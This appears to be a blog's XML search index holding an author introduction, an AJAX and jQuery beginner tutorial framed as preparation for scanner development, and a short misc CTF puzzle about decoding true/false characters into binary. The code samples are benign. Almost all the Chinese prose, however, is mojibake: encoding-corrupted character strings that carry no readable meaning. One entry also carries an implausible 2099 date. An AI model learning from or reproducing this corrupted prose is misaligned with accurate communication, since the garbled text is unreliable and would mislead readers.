<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[hack for sec!]]></title>
    <url>%2F2099%2F06%2F16%2Findex%2F</url>
    <content type="text"><![CDATA[Â∞èüê∑‰Ω©Â•áÂ∞ÜËá™Â∑±ÊâÄÂ≠¶ÂèäÂéÜÁ®ãËÆ∞ÂΩï‰∏ãÊù•ÔºåÂ¶ÇÊúâÈîôËØØËØ∑Â∏àÂÇÖ‰ª¨‰∏çÂêùËµêÊïô„ÄÇ Qq: 93426378 ÂÆâÂÖ®ÂÆ¢ÔºöÂ∞èÁå™‰Ω©Â•á ÂÖàÁü•Á§æÂå∫ÔºöÂ∞èÁå™‰Ω©Áê™ ÂàöÂÖ•Èó®ÁöÑËèúüêîÔºåÂ∏àÂÇÖÂ§öÂ§öÊèêÁÇπÔºå‰πüÂ∏åÊúõÊâÄËÆ∞ÂΩïËÉΩÂØπÂ∏àÂÇÖ‰ª¨ÊúâÊâÄÂ∏ÆÂä©„ÄÇ]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÂâçÁ´ØÂü∫Êú¨Â≠¶‰π†(Êâ´ÊèèÂô®ÂºÄÂèëÂáÜÂ§á)]]></title>
    <url>%2F2019%2F09%2F26%2F%E5%89%8D%E7%AB%AF%E5%9F%BA%E6%9C%AC%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[ajaxÁÆÄ‰ªãAJAX ÊòØ‰∏ÄÁßçÂú®Êó†ÈúÄÈáçÊñ∞Âä†ËΩΩÊï¥‰∏™ÁΩëÈ°µÁöÑÊÉÖÂÜµ‰∏ãÔºåËÉΩÂ§üÊõ¥Êñ∞ÈÉ®ÂàÜÁΩëÈ°µÁöÑÊäÄÊúØ„ÄÇ AJAX = ÂºÇÊ≠• JavaScript Âíå XML„ÄÇ AJAX ÊòØ‰∏ÄÁßçÁî®‰∫éÂàõÂª∫Âø´ÈÄüÂä®ÊÄÅÁΩëÈ°µÁöÑÊäÄÊúØ„ÄÇ ÈÄöËøáÂú®ÂêéÂè∞‰∏éÊúçÂä°Âô®ËøõË°åÂ∞ëÈáèÊï∞ÊçÆ‰∫§Êç¢ÔºåAJAX ÂèØ‰ª•‰ΩøÁΩëÈ°µÂÆûÁé∞ÂºÇÊ≠•Êõ¥Êñ∞„ÄÇËøôÊÑèÂë≥ÁùÄÂèØ‰ª•Âú®‰∏çÈáçÊñ∞Âä†ËΩΩÊï¥‰∏™ÁΩëÈ°µÁöÑÊÉÖÂÜµ‰∏ãÔºåÂØπÁΩëÈ°µÁöÑÊüêÈÉ®ÂàÜËøõË°åÊõ¥Êñ∞„ÄÇ ‰º†ÁªüÁöÑÁΩëÈ°µÔºà‰∏ç‰ΩøÁî® AJAXÔºâÂ¶ÇÊûúÈúÄË¶ÅÊõ¥Êñ∞ÂÜÖÂÆπÔºåÂøÖÈúÄÈáçËΩΩÊï¥‰∏™ÁΩëÈ°µÈù¢ Ajax-xmlhttprequestXMLHttpRequest ÊòØ AJAX ÁöÑÂü∫Á°ÄÔºåXMLHttpRequest Áî®‰∫éÂú®ÂêéÂè∞‰∏éÊúçÂä°Âô®‰∫§Êç¢Êï∞ÊçÆ„ÄÇËøôÊÑèÂë≥ÁùÄÂèØ‰ª•Âú®‰∏çÈáçÊñ∞Âä†ËΩΩÊï¥‰∏™ÁΩëÈ°µÁöÑÊÉÖÂÜµ‰∏ãÔºåÂØπÁΩëÈ°µÁöÑÊüêÈÉ®ÂàÜËøõË°åÊõ¥Êñ∞„ÄÇ Êó†ÈúÄÂà∑Êñ∞È°µÈù¢Êù•ËØ∑Ê±ÇÊúçÂä°Âô®Êï∞ÊçÆÂÜÖÂÆπ„ÄÇÂ¶ÇÈúÄÂ∞ÜËØ∑Ê±ÇÂèëÈÄÅÂà∞ÊúçÂä°Âô®ÔºåÊàë‰ª¨‰ΩøÁî® XMLHttpRequest ÂØπË±°ÁöÑ open() Âíå send() ÊñπÊ≥ïÔºö send‰ªÖÁî®‰∫épostËØ∑Ê±Ç„ÄÇ ‰ª£Á†ÅÁÆÄÂçïÂ∞ùËØïÔºåÊ†∏ÂøÉ‰ª£Á†Å function loadXMLDoc() { //ÂàõÂª∫xmlhttpËØ∑Ê±Ç var xmlhttp; xmlhttp=new XMLHttpRequest(); xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) { document.getElementById(&quot;myDiv&quot;).innerHTML=xmlhttp.responseText; } } xmlhttp.open(&quot;GET&quot;,&quot;/2.php&quot;,true); xmlhttp.send(); } ÁÇπÂáªËØ∑Ê±ÇÊï∞ÊçÆÂç≥ÂèØÂä†ËΩΩÂá∫2.phpÈ°µÈù¢ÁöÑÂÜÖÂÆπÔºåÂπ∂ÊèíÂÖ•Âà∞Ê†áÁ≠æid‰∏∫myDiv‰∏≠ Â¶ÇÊûúË¶ÅÊîπ‰∏∫postËØ∑Ê±ÇÂè™ÈúÄË¶ÅÂ∞ÜgetÊîπ‰∏∫post xmlhttp.open(&quot;POST&quot;,&quot;demo_post.asp&quot;,true); xmlhttp.send();Â¶ÇÊûúË¶ÅÊ∑ªÂä†httpÂ§¥ÔºåÈÇ£‰πàÈúÄË¶ÅsetRequestHeader()Êù•Ê∑ªÂä† xmlhttp.open(&quot;POST&quot;,&quot;ajax_test.asp&quot;,true); xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xmlhttp.send(&quot;fname=Bill&amp;lname=Gates&quot;);reponseÊé•Êî∂ÊúçÂä°Âô®ËøîÂõûÁöÑÊï∞ÊçÆÊúâ‰∏§ÁßçÊ†ºÂºèÔºå responseText Ëé∑ÂæóÂ≠óÁ¨¶‰∏≤ÂΩ¢ÂºèÁöÑÂìçÂ∫îÊï∞ÊçÆ„ÄÇ responseXML Ëé∑Âæó XML ÂΩ¢ÂºèÁöÑÂìçÂ∫îÊï∞ÊçÆ„ÄÇ‰ª•‰∏äÊ†∏ÂøÉ‰ª£Á†Å‰∏≠ÁöÑonreadystatechange ÊØèÂΩì readyState ÊîπÂèòÊó∂ÔºåÂ∞±‰ºöËß¶Âèë onreadystatechange ‰∫ã‰ª∂„ÄÇreadystateÊúâÂõõÁßçÂ±ûÊÄß 0: ËØ∑Ê±ÇÊú™ÂàùÂßãÂåñ 1: ÊúçÂä°Âô®ËøûÊé•Â∑≤Âª∫Á´ã 2: ËØ∑Ê±ÇÂ∑≤Êé•Êî∂ 3: ËØ∑Ê±ÇÂ§ÑÁêÜ‰∏≠ 4: ËØ∑Ê±ÇÂ∑≤ÂÆåÊàêÔºå‰∏îÂìçÂ∫îÂ∑≤Â∞±Áª™statusÊúâ‰∏§Áßç 200: &quot;OK&quot; 404: Êú™ÊâæÂà∞È°µÈù¢Â∫îÁî®‰ª£Á†Å if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)ÂΩìreadystateÁ≠â‰∫éÂõõÂπ∂‰∏îstatus‰∏∫200ÁöÑÊó∂ÂÄôË°®Á§∫Â∑≤ÁªèÂ∞±Áª™„ÄÇ Ajax-ÂºÇÊ≠•AJAX ÊåáÁöÑÊòØÂºÇÊ≠• JavaScript Âíå XMLÔºàAsynchronous JavaScript and XMLÔºâ„ÄÇ ÁêÜËß£‰∏∫ÂΩìÂèëÈÄÅ‰∏Ä‰∏™ÊâßË°åÂëΩ‰ª§ÁªôÊúçÂä°Âô®ÔºåÊúçÂä°Âô®ÈúÄË¶ÅËøêË°å‰∏ÄÊÆµÊó∂Èó¥ËøîÂõûÊï∞ÊçÆÔºåÈÄöËøáÂºÇÊ≠•ËØ∑Ê±ÇÔºåÂÖàÊâßË°åÊé•‰∏ãÊù•ÁöÑjs‰ª£Á†ÅÔºåËÄå‰∏çÊòØÁ≠âÊúçÂä°Âô®ÊâßË°åÂÆå‰πãÂêéÊâçÊâßË°åÂêéÈù¢ÁöÑ‰ª£Á†ÅÔºåÂç≥‰∏çÂêåÊ≠•„ÄÇ ÈÄöËøá AJAXÔºåJavaScript Êó†ÈúÄÁ≠âÂæÖÊúçÂä°Âô®ÁöÑÂìçÂ∫îÔºåËÄåÊòØÔºö Âú®Á≠âÂæÖÊúçÂä°Âô®ÂìçÂ∫îÊó∂ÊâßË°åÂÖ∂‰ªñËÑöÊú¨ ÂΩìÂìçÂ∫îÂ∞±Áª™ÂêéÂØπÂìçÂ∫îËøõË°åÂ§ÑÁêÜXMLHttpRequest ÂØπË±°Â¶ÇÊûúË¶ÅÁî®‰∫é AJAX ÁöÑËØùÔºåÂÖ∂ open() ÊñπÊ≥ïÁöÑ async ÂèÇÊï∞ÂøÖÈ°ªËÆæÁΩÆ‰∏∫ trueÔºö xmlhttp.open(&quot;GET&quot;,&quot;ajax_test.asp&quot;,true);ajax-php/aspÂä®ÊÄÅÂÆû‰æãÊü•ËØ¢‰ª£Á†ÅÂÆû‰æã &lt;html&gt; &lt;head&gt; &lt;title&gt;ÊµãËØï&lt;/title&gt; &lt;link href=&quot;/static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;all&quot; /&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; function showHint(str) { var xmlhttp; if (str.length==0) { document.getElementById(&quot;txtHint&quot;).innerHTML=&quot;&quot;; return; } if (window.XMLHttpRequest) {// code for IE7+, Firefox, Chrome, Opera, Safari xmlhttp=new XMLHttpRequest(); } else {// code for IE6, IE5 xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) { document.getElementById(&quot;txtHint&quot;).innerHTML=xmlhttp.responseText; } } xmlhttp.open(&quot;GET&quot;,&quot;/1.php?test=&quot;+str,true); xmlhttp.send(); } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h3&gt;ËØ∑ËæìÂÖ•ÊàêËØ≠ÂºÄÂ§¥Êï∞Â≠ó&lt;/h3&gt; &lt;form action=&quot;&quot;&gt; ËæìÂÖ•Ôºö&lt;input type=&quot;text&quot; id=&quot;txt1&quot; onkeyup=&quot;showHint(this.value)&quot; /&gt; &lt;/form&gt; &lt;p&gt;ÁªìÊûúÔºö&lt;span id=&quot;txtHint&quot;&gt;&lt;/span&gt;&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; ÂêéÁ´Ø 1.php‰ª£Á†Å &lt;?php if($_GET[&apos;test&apos;]==&apos;1&apos;) { echo &quot;‰∏ÄÂøÉ‰∏ÄÊÑè&quot;; } else if($_GET[&apos;test&apos;]==&apos;2&apos;) { echo &quot;‰∫åÈæôÊàèÁè†&quot;; } ?&gt;ËæìÂÖ•1ÂõûÊòæ ‰∏ÄÂøÉ‰∏ÄÊÑèÔºåËæìÂÖ•2ÂõûÊòæ‰∫åÈæôÊàèÁè† Â¶ÇÊûúËæìÂÖ•Ê°Ü‰∏∫Á©∫ (str.length==0)ÔºåÂàôËØ•ÂáΩÊï∞Ê∏ÖÁ©∫ txtHint Âç†‰ΩçÁ¨¶ÁöÑÂÜÖÂÆπÔºåÂπ∂ÈÄÄÂá∫ÂáΩÊï∞„ÄÇÂê¶ÂàôÊâßË°å‰∏ãÈù¢ÁöÑÂáΩÊï∞„ÄÇ select Êü•ËØ¢ ÂèØÁî® onchange Êù•Ë∞ÉÁî®ËøîÂõûÔºåselectÁÇπÂáªÈÄâÊã©Âç≥ÂèØËøîÂõûÁªôËá™ÂÆöÂáΩÊï∞Êù•Êü•ËØ¢ËøîÂõûÁªìÊûú„ÄÇ &lt;select name=&quot;customers&quot; onchange=&quot;showCustomer(this.value)&quot; style=&quot;font-family:Verdana, Arial, Helvetica, sans-serif;&quot;&gt;JQueryÁÆÄ‰ªãjQueryÊòØ‰∏Ä‰∏™Âø´ÈÄü„ÄÅÁÆÄÊ¥ÅÁöÑJavaScriptÊ°ÜÊû∂ÔºåÊòØÁªßPrototype‰πãÂêéÂèà‰∏Ä‰∏™‰ºòÁßÄÁöÑJavaScript‰ª£Á†ÅÂ∫ìÔºàÊàñJavaScriptÊ°ÜÊû∂Ôºâ„ÄÇjQueryËÆæËÆ°ÁöÑÂÆóÊó®ÊòØ‚Äúwrite LessÔºåDo More‚ÄùÔºåÂç≥ÂÄ°ÂØºÂÜôÊõ¥Â∞ëÁöÑ‰ª£Á†ÅÔºåÂÅöÊõ¥Â§öÁöÑ‰∫ãÊÉÖ„ÄÇÂÆÉÂ∞ÅË£ÖJavaScriptÂ∏∏Áî®ÁöÑÂäüËÉΩ‰ª£Á†ÅÔºåÊèê‰æõ‰∏ÄÁßçÁÆÄ‰æøÁöÑJavaScriptËÆæËÆ°Ê®°ÂºèÔºå‰ºòÂåñHTMLÊñáÊ°£Êìç‰Ωú„ÄÅ‰∫ã‰ª∂Â§ÑÁêÜ„ÄÅÂä®ÁîªËÆæËÆ°ÂíåAjax‰∫§‰∫í„ÄÇ jQuery ‰∏≠ÊâÄÊúâÈÄâÊã©Âô®ÈÉΩ‰ª•ÁæéÂÖÉÁ¨¶Âè∑ÂºÄÂ§¥Ôºö$()„ÄÇ Âú®html‰∏≠‰ΩøÁî®jquery‰πãÂâçÈ¶ñÂÖàÂºïÂÖ•jqueryÂ∫ìÔºåÂèØ‰ª•‰∏ãËΩΩjsÂ∫ìÂà∞Êú¨Âú∞ÔºåÂºïÁî® &lt;script src=&quot;jquery-1.10.2.min.js&quot;&gt;&lt;/script&gt;ÊàñËÄÖÂºïÁî®Ë∞∑Ê≠åÁôæÂ∫¶Á≠âjqueryÁöÑjsÊñá‰ª∂„ÄÇ &lt;script src=&quot;https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js&quot;&gt;ËØ≠Ê≥ï$(selector).action() ÁæéÂÖÉÁ¨¶Âè∑ÂÆö‰πâ jQuery ÈÄâÊã©Á¨¶ÔºàselectorÔºâ&quot;Êü•ËØ¢&quot;Âíå&quot;Êü•Êâæ&quot; HTML ÂÖÉÁ¥† jQuery ÁöÑ action() ÊâßË°åÂØπÂÖÉÁ¥†ÁöÑÊìç‰Ωú ÂÆû‰æã: $(this).hide() - ÈöêËóèÂΩìÂâçÂÖÉÁ¥† $(&quot;p&quot;).hide() - ÈöêËóèÊâÄÊúâ &lt;p&gt; ÂÖÉÁ¥† $(&quot;p.test&quot;).hide() - ÈöêËóèÊâÄÊúâ class=&quot;test&quot; ÁöÑ &lt;p&gt; ÂÖÉÁ¥† $(&quot;#test&quot;).hide() - ÈöêËóèÊâÄÊúâ id=&quot;test&quot; ÁöÑÂÖÉÁ¥†ÊµãËØï‰ª£Á†Å &lt;script&gt; $(&quot;p&quot;).hide(); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;Â¶ÇÊûú‰Ω†ÁÇπÊàëÔºåÊàëÂ∞±‰ºöÊ∂àÂ§±„ÄÇ&lt;/p&gt; &lt;p&gt;ÁªßÁª≠ÁÇπÊàë!&lt;/p&gt; &lt;p&gt;Êé•ÁùÄÁÇπÊàë!&lt;/p&gt; &lt;/body&gt; &lt;/html&gt;‰ª•‰∏ä‰ª£Á†ÅÂπ∂‰∏ç‰ºöÈöêËóèpÊ†áÁ≠æÈáåÁöÑ‰ª£Á†Å„ÄÇÂõ†‰∏∫Âú®ÂÆûÈôÖËØ≠Ê≥ï‰∏≠ÈÉΩÊòØÂ¶Ç‰∏ã $(document).ready(function(){ // jQuery ‰ª£Á†Å... });ËøôÊòØ‰∏∫‰∫ÜÈò≤Ê≠¢ÊñáÊ°£Âú®ÂÆåÂÖ®Âä†ËΩΩÔºàÂ∞±Áª™Ôºâ‰πãÂâçËøêË°å jQuery ‰ª£Á†ÅÔºåÂç≥Âú® DOM Âä†ËΩΩÂÆåÊàêÂêéÊâçÂèØ‰ª•ÂØπ DOM ËøõË°åÊìç‰Ωú„ÄÇ Â¶ÇÊûúÂú®ÊñáÊ°£Ê≤°ÊúâÂÆåÂÖ®Âä†ËΩΩ‰πãÂâçÂ∞±ËøêË°åÂáΩÊï∞ÔºåÊìç‰ΩúÂèØËÉΩÂ§±Ë¥•„ÄÇ ÁÆÄÊ¥ÅÂÜôÊ≥ïÂíå‰∏äÈù¢ÁöÑÂÜôÊ≥ïÊïàÊûú‰∏ÄÊ†∑ $(function(){ // ÂºÄÂßãÂÜô jQuery ‰ª£Á†Å... });ÊàêÂäüÊâßË°åÈöêËóèpÊ†áÁ≠æ‰ª£Á†ÅÔºåÂ¶Ç‰∏ã„ÄÇ $(function(){ $(&quot;p&quot;).hide(); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;Â¶ÇÊûú‰Ω†ÁÇπÊàëÔºåÊàëÂ∞±‰ºöÊ∂àÂ§±„ÄÇ&lt;/p&gt; &lt;p&gt;ÁªßÁª≠ÁÇπÊàë!&lt;/p&gt; &lt;p&gt;Êé•ÁùÄÁÇπÊàë!&lt;/p&gt;ÈÄâÊã©ËØ≠Ê≥ïÊé•‰∏ãÊù•‰∏ÄÁªÑÂä®ÊÄÅÊâßË°åÁöÑ‰ª£Á†ÅÔºåÈúÄË¶ÅÁÇπÂáªÈöêËóèÔºåÂØπidÁöÑÈÄâÂèñËØ≠Ê≥ï $(‚Äú#test‚Äù)‰πüÂ∞±ÊòØÂ§öÂä†‰∏Ä‰∏™# $(document).ready(function(){ $(&quot;button&quot;).click(function(){ $(&quot;#test&quot;).hide(); }); });ÂØπbuttonÊ†áÁ≠æÊâßË°åclickÊñπÊ≥ïÔºåÁÇπÂáªbuttonÊ†áÁ≠æÔºåÊâßË°åÂáΩÊï∞id‰∏∫testÁöÑÈöêËóè„ÄÇ ÂØπclassÁöÑÈÄâÊã©ÔºåËØ≠Ê≥ï‰∏∫$(‚Äú.test‚Äù)Ôºå‰πüÂ∞±ÊòØÂ§öÂä†‰∏Ä‰∏™ÁÇπ‰∏∫ÈÄâÊã©classÁöÑÊ†áÁ≠æ„ÄÇÂ∞Üclass‰∏∫testÁöÑÊ†áÁ≠æÈöêËóè„ÄÇ ‰∫ã‰ª∂clickÁÇπÂáªÂ∞±ÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑ‰∫ã‰ª∂Ôºå $(&quot;p&quot;).click();jquery‰∫ã‰ª∂ https://www.runoob.com/jquery/jquery-events.htmljquery-ajaxÂÆåÊï¥‰ª£Á†ÅÂºïÁî® &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;jquery-ajax&lt;/title&gt; &lt;script src=&quot;https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js&quot;&gt; &lt;/script&gt; &lt;script&gt; $(document).ready(function(){ $(&quot;button&quot;).click(function(){ $(&quot;#div1&quot;).load(&quot;/1.php&quot;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;div1&quot;&gt;&lt;h2&gt;‰ΩøÁî® jQuery AJAX ‰øÆÊîπÊñáÊú¨ÂÜÖÂÆπ&lt;/h2&gt;&lt;/div&gt; &lt;button&gt;Ëé∑ÂèñÂ§ñÈÉ®ÂÜÖÂÆπ&lt;/button&gt; &lt;/body&gt; &lt;/html&gt;ÁÇπÂáªÊåâÈíÆËß¶Âèëload()‰∫ã‰ª∂Âä†ËΩΩÂ§ñÈÉ®Êñá‰ª∂„ÄÇ Âú®load‰∫ã‰ª∂ÂêéÂ¢ûÂä†functionÂáΩÊï∞ÔºåÂ¶ÇÊûúÊàêÂäüÂä†ËΩΩÂàôËøîÂõûÂºπÁ™óÂä†ËΩΩÊàêÂäü„ÄÇ $(&quot;button&quot;).click(function(){ $(&quot;#div1&quot;).load(&quot;demo_test.txt&quot;,function(responseTxt,statusTxt,xhr){ if(statusTxt==&quot;success&quot;) alert(&quot;Â§ñÈÉ®ÂÜÖÂÆπÂä†ËΩΩÊàêÂäü!&quot;); if(statusTxt==&quot;error&quot;) alert(&quot;Error: &quot;+xhr.status+&quot;: &quot;+xhr.statusText); }); });Âä†ËΩΩÂ§ñÈÉ®Êñá‰ª∂ËøòÂèØÁî®getÊñπÊ≥ï postÊñπÊ≥ï„ÄÇ $.get(URL,callback); $(&quot;button&quot;).click(function(){ $.get(&quot;demo_test.php&quot;,function(data,status){ alert(&quot;Êï∞ÊçÆ: &quot; + data + &quot;\nÁä∂ÊÄÅ: &quot; + status); }); });$.post(URL,data,callback); $(document).ready(function(){ $(&quot;button&quot;).click(function(){ $.post(&quot;/try/ajax/demo_test_post.php&quot;,{ name:&quot;ËèúÈ∏üÊïôÁ®ã&quot;, url:&quot;http://www.runoob.com&quot; }, function(data,status){ alert(&quot;Êï∞ÊçÆ: \n&quot; + data + &quot;\nÁä∂ÊÄÅ: &quot; + status); }); }); });ÂèÇËÄÉÂ≠¶‰π†Ôºöhttps://www.w3school.com.cnÂèÇËÄÉÂ≠¶‰π†Ôºöhttps://www.runoob.com/]]></content>
      <tags>
        <tag>ÊùÇ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[misc-ctf]]></title>
    <url>%2F2019%2F09%2F21%2Fmisc-ctf%2F</url>
    <content type="text"><![CDATA[ÁúüÁúüÂÅáÂÅáÂºÄÂ±ÄÈ¢òÁõÆÊèèËø∞ ÁúüÁúüÁúüÁúüÁúüÁúüÁúüÂÅáÂÅáÂÅáÁúüÂÅáÁúüÂÅáÁúüÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÂÅáÁúüÁúüÁúüÁúüÁúüÁúüÁúüÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÂÅáÂÅáÁúüÂÅáÁúüÁúüÁúüÁúüÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÁúüÂÅáÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÂÅáÁúüÂÅáÂÅáÂÅáÁúüÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÁúüÁúüÁúüÂÅáÁúüÁúüÂÅáÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÁúüÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÁúüÁúüÂÅáÂÅáÂÅáÁúüÂÅáÁúüÁúüÁúüÂÅáÁúüÁúüÂÅáÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÁúüÂÅáÁúüÁúüÁúüÁúüÂÅáÂÅáÁúüÂÅáÁúüÁúüÂÅáÁúüÂÅáÁúüÁúüÁúüÂÅáÁúüÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÁúüÂÅáÁúüÂÅáÂÅáÂÅáÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÂÅáÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÁúüÁúüÁúüÁúüÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÂÅáÁúüÂÅáÁúüÂÅáÁúüÂÅáÁúüÂÅáÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÁúüÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÂÅáÂÅáÁúüÂÅáÁúüÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÂÅáÂÅáÂÅáÁúüÁúüÂÅáÂÅáÂÅáÁúüÂÅáÁúüÂÅáÂÅáÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÂÅáÂÅáÁúüÁúüÂÅáÁúüÁúüÂÅáÂÅáÂÅáÁúüÁúüÁúüÁúüÁúüÁúüÂÅáÂÅáÁúüÂÅáÁúüÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÂÅáÁúüÁúüÁúüÂÅáÂÅáÁúüÁúüÁúüÁúüÁúüÁúüÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÂÅáÁúüÁúüÂÅáÁúüÁúüÂÅáÂÅáÂÅáÁúüÁúüÂÅáÂÅáÁúüÁúüÁúüÂÅáÁúüÂÅáÂÅáÂÅáÂÅáÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÁúüÂÅáÂÅáÁúüÂÅáÁúüÁúüÂÅáÁúüÁúüÂÅáÂÅáÂÅáÁúüÁúüÁúüÂÅáÂÅáÁúüÁúüÂÅáÂÅáÂÅáÁúüÁúüÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÂÅáÂÅáÁúüÂÅáÁúüÂÅáÁúüÁúüÁúüÂÅáÂÅáÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÁúüÂÅáÂÅáÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÁúüÂÅáÁúüÂÅáÁúüÂÅáÁúüÁúüÁúüÂÅáÂÅáÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÁúüÁúüÁúüÂÅáÂÅáÂÅáÁúüÂÅáÂÅáÁúüÂÅáÂÅáÁúüÂÅáÂÅáÂÅáÁúüÁúüÂÅáÂÅáÁúüÂÅáÁúüÁúüÁúüÁúüÂÅáÁúüÂÅáÂÅáÂÅáÁúüÂÅáÂÅáÁúüÂÅáÁúüÂÅáÂÅáÁúüÂÅáÁúüÂÅáÂÅáÁúüÂÅáÂÅáÁúüÂÅáÂÅáÁúüÂÅáÂÅáÂÅáÁúüÁúüÂÅáÂÅáÁúüÁúüÁúüÂÅáÂÅáÂÅáÁúüÂÅáÁúüÁúüÂÅáÂÅáÁúüÂÅáÂÅáÂÅáÁúüÁúüÂÅáÁúüÁúüÂÅáÂÅáÁúüÁúüÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÂÅáÁúüÁúüÂÅáÁúüÂÅáÂÅáÁúüÁúüÂÅáÁúüÁúüÁúüÂÅáÂÅáÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÁúüÁúüÁúüÂÅáÂÅáÂÅáÁúüÁúüÁúüÁúüÁúüÂÅáÁúüÁúüÂÅáÁúüÁúüÂÅáÂÅáÁúüÂÅáÁúüÂÅáÂÅáÁúüÂÅáÁúüÁúüÂÅáÂÅáÂÅáÂÅáÁúüÁúüÁúüÂÅáÁúüÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÂÅáÁúüÁúüÁúüÂÅáÁúüÁúüÂÅáÂÅáÁúüÁúüÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÁúüÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÁúüÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÂÅáÂÅáÁúüÂÅáÂÅáÁúüÁúüÁúüÁúüÁúüÁúüÁúüÁúüÁúüÂÅáÂÅáÁúüÁúüÂÅáÁúüÂÅáÂÅáÁúüÂÅáÂÅáÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÁúüÂÅáÂÅáÂÅáÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÁúüÁúüÂÅáÂÅáÁúüÁúüÂÅáÂÅáÂÅáÁúüÂÅáÂÅáÁúüÁúüÁúüÂÅáÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÂÅáÂÅáÁúüÁúüÂÅáÂÅáÁúüÂÅáÁúüÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÁúüÁúüÂÅáÂÅáÁúüÂÅáÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÂÅáÁúüÂÅáÂÅáÁúüÁúüÁúüÂÅáÁúüÂÅáÂÅáÁúüÁúüÁúüÁúüÂÅáÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÁúüÁúüÂÅáÁúüÂÅáÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÂÅáÂÅáÁúüÂÅáÂÅáÂÅáÁúüÁúüÁúüÁúüÂÅáÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÂÅáÂÅáÁúüÂÅáÁúüÁúüÁúüÁúüÁúüÁúüÁúüÂÅáÁúüÂÅáÂÅáÁúüÂÅáÂÅáÂÅáÁúüÂÅáÁúüÂÅáÁúüÂÅáÂÅáÂÅáÂÅáÂÅáÁúüÁúüÂÅáÂÅáÂæàÁõ¥Êé•ÔºåÁúüÊõøÊç¢1ÔºåÂÅáÊõøÊç¢0„ÄÇ 111111100010101000010011111111000001000101111000010100000110111010101000110000001011101101110101110111111100010111011011101011011110010110101110110000010101000111010101000001111111101010101010101011111110000000010001011000000000000010111110001100010100101111100110110001111110010110111110111001111111011111011011000110011101000011101011001011011000111001100011101111100101011100100000101001000000110101011100111010111100010010010001100101111010001001010010100100100100011001110001011001000110110011101111101101001101110011101011110001111101101100101001011000011101100000100001001110110011111010111110111111100000000001011000000001000100111111111001101001001110101100010000010111010111001100010011101110101001100101101111111001011101010111110100111010011110111010111111010100001011010